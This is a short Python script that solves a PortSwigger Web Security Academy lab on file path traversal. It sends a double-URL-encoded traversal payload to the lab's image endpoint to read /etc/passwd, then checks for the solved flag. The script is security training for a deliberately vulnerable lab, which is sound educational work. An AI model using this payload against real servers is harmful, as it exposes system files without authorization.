#!/usr/bin/env python

'''This lab contains a file path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file.

Lab link: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode
'''
import requests


lab_id = '0a0c00c604ca71f981e3fce200a300d0' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/"  


payload = 'image?filename=..%252f..%252f..%252fetc/passwd' # directory traversal payload, exploit the image endpoint by using the 'filename' paramater

r1 = requests.get(uri + payload)
print(r1.text)

# reload page to trigger success flag
r2 = requests.get(uri)
if 'Solved' in r2.text:
    print('solved')
else:
    print('nope')